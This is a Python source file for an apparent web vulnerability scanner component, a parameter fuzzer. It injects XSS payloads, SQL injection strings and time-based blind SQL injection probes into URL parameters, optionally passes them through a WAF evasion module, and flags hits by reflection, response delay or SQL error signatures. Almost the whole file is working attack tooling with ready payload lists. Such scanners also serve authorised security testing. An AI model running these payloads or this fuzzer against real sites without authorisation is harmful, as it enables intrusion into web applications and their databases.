"""
Parameter Fuzzer - Smart Parameter Discovery & Payload Injection
"""
import asyncio
import urllib.parse
from typing import List, Dict, Set, Optional, Tuple
import copy

class ParameterFuzzer:
    def __init__(self, engine, waf_evasion=None):
        self.engine = engine
        self.waf = waf_evasion
        
        # Test payloads
        self.payloads = {
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "\"><script>alert(String.fromCharCode(88,83,83))</script>",
                "<svg/onload=alert('XSS')>",
                "'\"><script>alert(1)</script>",
            ],
            "sqli": [
                "' OR '1'='1",
                "' OR 1=1--",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "1 UNION SELECT null--",
                "1' UNION SELECT 1,2,3--",
                "1\" AND 1=1--",
            ],
            "reflected": [
                "FUZZ_{random}_TEST",
                "<b>TEST</b>",
                "test\"><script>",
            ],
            "blind": [
                "1 AND SLEEP(5)",
                "1' AND SLEEP(5)--",
                "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
            ]
        }
    
    async def fuzz_url_parameters(self, url: str, param_list: List[str] = None) -> List[Dict]:
        """
        Fuzz parameters in URL
        """
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params and not param_list:
            return []
        
        findings = []
        test_params = list(params.keys()) if params else param_list
        
        for param in test_params:
            # Test Reflected
            reflected = await self._test_reflected(url, param)
            if reflected:
                findings.append(reflected)
            
            # Test XSS
            xss = await self._test_xss(url, param)
            if xss:
                findings.append(xss)
            
            # Test SQLi
            sqli = await self._test_sqli(url, param)
            if sqli:
                findings.append(sqli)
        
        return findings
    
    async def _test_reflected(self, url: str, param: str) -> Optional[Dict]:
        """Test Reflected Parameter"""
        marker = f"REFLECT_TEST_{hash(url) % 10000}"
        test_url = self._inject_param(url, param, marker)
        
        result = await self.engine.request("GET", test_url)
        
        if result.body and marker in result.body:
            return {
                "type": "REFLECTED_PARAMETER",
                "url": url,
                "parameter": param,
                "payload": marker,
                "evidence": "Parameter value reflected in response",
                "severity": "MEDIUM"
            }
        return None
    
    async def _test_xss(self, url: str, param: str) -> Optional[Dict]:
        """Test XSS"""
        for payload in self.payloads["xss"]:
            # Apply WAF evasion if available
            if self.waf:
                payload = self.waf.evade_payload(payload)
            
            test_url = self._inject_param(url, param, payload)
            result = await self.engine.request("GET", test_url)
            
            if self._detect_xss(result.body, payload):
                return {
                    "type": "XSS",
                    "url": url,
                    "parameter": param,
                    "payload": payload,
                    "context": self._get_xss_context(result.body, payload),
                    "severity": "HIGH"
                }
        return None
    
    async def _test_sqli(self, url: str, param: str) -> Optional[Dict]:
        """Test SQL Injection"""
        # Test time-based first (blind)
        for payload in self.payloads["blind"]:
            if self.waf:
                payload = self.waf.evade_payload(payload, "sql")
            
            start_time = asyncio.get_event_loop().time()
            test_url = self._inject_param(url, param, payload)
            result = await self.engine.request("GET", test_url)
            elapsed = asyncio.get_event_loop().time() - start_time
            
            if elapsed > 4.5:  # SLEEP(5)
                return {
                    "type": "SQL_INJECTION_BLIND",
                    "url": url,
                    "parameter": param,
                    "payload": payload,
                    "response_time": elapsed,
                    "severity": "CRITICAL"
                }
        
        # Test error-based
        for payload in self.payloads["sqli"][:3]:
            if self.waf:
                payload = self.waf.evade_payload(payload, "sql")
            
            test_url = self._inject_param(url, param, payload)
            result = await self.engine.request("GET", test_url)
            
            if self._detect_sql_error(result.body):
                return {
                    "type": "SQL_INJECTION_ERROR",
                    "url": url,
                    "parameter": param,
                    "payload": payload,
                    "error_signature": self._extract_sql_error(result.body),
                    "severity": "CRITICAL"
                }
        
        return None
    
    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject value into parameter"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))
    
    def _detect_xss(self, body: str, payload: str) -> bool:
        """Detect XSS in response"""
        if not body:
            return False
        
        # Check for raw payload
        if payload in body:
            return True
        
        # Check for escaped version
        escaped = urllib.parse.quote(payload)
        if escaped in body:
            return True
        
        # Check for script execution
        if "<script>" in payload and "alert" in payload:
            if "alert" in body and "<script>" in body:
                return True
        
        return False
    
    def _detect_sql_error(self, body: str) -> bool:
        """Detect SQL errors"""
        if not body:
            return False
        
        error_signatures = [
            "sql syntax", "mysql_fetch", "pg_query", "ora-",
            "sqlserver", "jdbc", "odbc", "syntax error",
            "unclosed quotation", "you have an error",
            "warning: mysql", "sqlite_query", "pg_exec"
        ]
        
        body_lower = body.lower()
        return any(sig in body_lower for sig in error_signatures)
    
    def _extract_sql_error(self, body: str) -> str:
        """Extract SQL error text"""
        idx = body.lower().find("error")
        if idx != -1:
            start = max(0, idx - 50)
            end = min(len(body), idx + 50)
            return body[start:end]
        return ""
    
    def _get_xss_context(self, body: str, payload: str) -> str:
        """Get XSS context"""
        idx = body.find(payload)
        if idx == -1:
            idx = body.find(urllib.parse.quote(payload))
        
        if idx != -1:
            start = max(0, idx - 100)
            end = min(len(body), idx + len(payload) + 100)
            return body[start:end]
        return ""